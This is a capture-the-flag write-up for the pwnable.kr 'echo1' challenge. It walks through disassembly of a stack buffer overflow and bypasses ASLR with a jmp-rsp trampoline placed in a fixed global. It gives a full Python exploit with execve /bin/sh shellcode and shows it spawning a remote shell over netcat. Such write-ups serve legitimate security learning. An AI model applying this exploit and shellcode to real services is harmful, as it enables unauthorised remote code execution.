---
title: Echo1 - Pwnable.kr
date: 2017-01-19
categories: [Writeups, Pwnable.kr]
tags: ['Buffer overflow']
image:
    path: "/unsorted/pwnablekr.png"

---


Once we execute the program, it will ask for our name and then present
a menu from where we can choose one type of echo service. *BOF echo* is
the only one working. If we try to overflow the buffer we get a beautiful
`Segmentation fault (core dumped)` that's a good sign...

```console
$ ./echo1 
hey, what's your name? : werew

- select echo type -
- 1. : BOF echo
- 2. : FSB echo
- 3. : UAF echo
- 4. : exit
> 1
hello werew
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

goodbye werew
Segmentation fault (core dumped)
```


Let's have a closer look at what it's happening here:

```nasm
/ (fcn) sym.echo1 90                                                                                                                                                                 
|           ; var int buff @ rbp-0x20                                                                                                                                                
|           0x00400818      55             push rbp                                                                                                                                  
|           0x00400819      4889e5         mov rbp, rsp                                                                                                                              
|           0x0040081c      4883ec20       sub rsp, 0x20                                                                                                                             
|           0x00400820      488b05711820.  mov rax, qword [rip + 0x201871] ; [0x602098:8]=0x6e692e0062617472 LEA obj.o ; "rtab" @ 0x602098                                           
|           0x00400827      488b5018       mov rdx, qword [rax + 0x18] ; [0x18:8]=0x4006b0 sym._start                                                                                
|           0x0040082b      488b05661820.  mov rax, qword [rip + 0x201866] ; [0x602098:8]=0x6e692e0062617472 LEA obj.o ; "rtab" @ 0x602098                                           
|           0x00400832      4889c7         mov rdi, rax                                                                                                                              
|           0x00400835      ffd2           call rdx                    ; sym.greetings                                                                                               
|           0x00400837      488d45e0       lea rax, [rbp - buff]       ;[2]                                                                                                          
|           0x0040083b      be80000000     mov esi, 0x80                                                                                                                             
|           0x00400840      4889c7         mov rdi, rax                                                                                                                              
|           0x00400843      e84cffffff     call sym.get_input          ;[3]                                                                                                          
|           0x00400848      488d45e0       lea rax, [rbp - buff]       ;[2]                                                                                                          
|           0x0040084c      4889c7         mov rdi, rax                                                                                                                              
|           0x0040084f      e8dcfdffff     call sym.imp.puts           ;[4]                                                                                                          
|           0x00400854      488b053d1820.  mov rax, qword [rip + 0x20183d] ; [0x602098:8]=0x6e692e0062617472 LEA obj.o ; "rtab" @ 0x602098                                           
|           0x0040085b      488b5020       mov rdx, qword [rax + 0x20] ; [0x20:8]=64 ; "@" 0x00000020                                                                                
|           0x0040085f      488b05321820.  mov rax, qword [rip + 0x201832] ; [0x602098:8]=0x6e692e0062617472 LEA obj.o ; "rtab" @ 0x602098                                           
|           0x00400866      4889c7         mov rdi, rax                                                                                                                              
|           0x00400869      ffd2           call rdx                    ; sym.byebye                                                                                                  
|           0x0040086b      b800000000     mov eax, 0                                                                                                                                
|           0x00400870      c9             leave                                                                                                                                     
\           0x00400871      c3             ret
```


When we select the option 1 (echo1) the function echo1 will be called,
this last, after reserving the space on the stack for a buffer 0x20
 bytes big, will:
- Politely say 'hello'
- Read the an input 0x80 big into the buffer (!!!)
- Print the buffer to stdout
- Leave saying 'goodbye'

Bingo! This is it, we can overflow the buffer of the function `echo1` and
change the return address. In this program the stack is executable and 
we have all the space we need to put a shellcode.


There is only one problem: how the hell do we get the address of the shellcode?
As normal ASLR comes to make things more difficult :'(

Even with a nop sled guessing the address would take too much time 
(we are on 64 bits exploiting a service trough a network!).

If we check carefully the parts of the program that are not affected by
ASLR we can determine if there is any fixed-address data over which
we have control. It turns out there is one.

```nasm
|           0x00400936      b8be0b4000     mov eax, str._24s           ; "%24s" @ 0x400bbe                                                                   
|           0x0040093b      488d55e0       lea rdx, [rbp - name]       ;[2]            
|           0x0040093f      4889d6         mov rsi, rdx               
|           0x00400942      4889c7         mov rdi, rax                                                                                                                        
|           0x00400945      b800000000     mov eax, 0                                                                                                                     
|           0x0040094a      e851fdffff     call sym.imp.__isoc99_scanf ;[3]                                                                                                     
|           0x0040094f      488b05421720.  mov rax, qword [rip + 0x201742] ; [0x602098:8]=0x6e692e0062617472 LEA obj.o ; "rtab" @ 0x602098                                      
|           0x00400956      488d55e0       lea rdx, [rbp - name]       ;[2]                                                                                                    
|           0x0040095a      488b0a         mov rcx, qword [rdx]                 
|           0x0040095d      488908         mov qword [rax], rcx       
|           0x00400960      488b4a08       mov rcx, qword [rdx + 8]    ; [0x8:8]=0 LEA rdx ; rdx                                                                                     
|           0x00400964      48894808       mov qword [rax + 8], rcx                                                                                                                  
|           0x00400968      488b5210       mov rdx, qword [rdx + 0x10] ; [0x10:8]=0x1003e0002                                                                                        
|           0x0040096c      48895010       mov qword [rax + 0x10], rdx                                                                                                               
|           0x00400970      488d45e0       lea rax, [rbp - name]       ;[2]                                                                                                          
|           0x00400974      8b00           mov eax, dword [rax]                                                                                                                      
|           0x00400976      890524172000   mov dword [rip + 0x201724], eax ; [0x6020a0:4]=0x70726574 LEA obj.id ; "terp" @ 0x6020a0                                                  
|           0x0040097c      e8effcffff     call sym.imp.getchar        ;[4]                                                        
```


During the execution of the function `main`, the first 4 bytes on our name gets
copied into a global object called `id` at the address `0x6020a0`.
We can use that to set a trampoline to our shellcode, we can jump to the
address pointed by `rsp` and reach our shellcode.
[Here](https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/) there is a good resource about how can we jump into our shellcode.


Let's write the exploit:

```python
jmp = "\xff\xe4"                                    # jmp %rsp
ret_addr = "\xa0\x20\x60\x00\x00\x00\x00\x00"       # obj.id
shellcode = (                                       # From: http://shell-storm.org/shellcode/files/shellcode-603.php
    "\x48\x31\xd2"                                  # xor    %rdx, %rdx
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      # mov  $0x68732f6e69622f2f, %rbx
    "\x48\xc1\xeb\x08"                              # shr    $0x8, %rbx
    "\x53"                                          # push   %rbx
    "\x48\x89\xe7"                                  # mov    %rsp, %rdi
    "\x50"                                          # push   %rax
    "\x57"                                          # push   %rdi
    "\x48\x89\xe6"                                  # mov    %rsp, %rsi
    "\xb0\x3b"                                      # mov    $0x3b, %al
    "\x0f\x05" )                                    # syscall


print( 
       jmp + "\x0a" +       # Name
       "1\x0a"      +       # Option
       "A"*0x28     +       # To fill the buffer until the ret addr (0x28=sizebuff+rbp)
       ret_addr     +       # Address of the trampoline
       shellcode            # The shellcode
    );
```


And try it:

```console
$ (python echo1_exploit.py ; cat - ) | nc pwnable.kr 9010
hey, what's your name? : 
- select echo type -
- 1. : BOF echo
- 2. : FSB echo
- 3. : UAF echo
- 4. : exit
> hello �
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA� `
goodbye �
ls
echo1
flag
log
super.pl
cat flag
H4d_****_***_w1th_****_ov3rfl0w
```


